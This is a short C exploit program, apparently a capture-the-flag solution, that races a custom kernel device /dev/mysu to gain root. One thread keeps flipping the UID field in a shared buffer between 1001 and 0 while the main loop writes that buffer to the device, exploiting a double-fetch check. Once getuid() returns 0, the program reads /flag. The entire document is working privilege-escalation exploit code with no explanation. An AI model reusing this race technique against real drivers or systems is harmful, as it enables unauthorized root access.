#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdio.h>


unsigned int write_buffer[3] = {1001, 0xe521bab2, 1}; // Enter real password instead of 0


void *alternate_uid(void *a)
{
    while (1)
    {
        write_buffer[0] = 1001;
        printf("Now 1001!\n");
        write_buffer[0] = 0;
        printf("Now 0!\n");
    }
}


int main(void)
{
    int mysu_fd, th_ret, current_uid;
    pthread_t alternator_thread;

    // Create a thread which modifies write_buffer UID part
    th_ret = pthread_create(&alternator_thread, NULL, alternate_uid, NULL);

    // Test: print contents of write_buffer
    //while(1)
    //{
    //    printf("%u %u\n", write_buffer[0], write_buffer[1]);
    //}

    // Write to /dev/mysu and hope for the best
    mysu_fd = open("/dev/mysu", O_WRONLY);

    while (current_uid != 0)
    {
        write(mysu_fd, (char *)write_buffer, 8);
        current_uid = getuid();
        printf("%u\n", current_uid);
    }
    
    close(mysu_fd);

    char *exec = "/bin/cat";
    char *argv[3] = {exec, "/flag", 0};
    int exec_ret = execve(exec, argv, 0);

    exit(current_uid);

    return 0;
}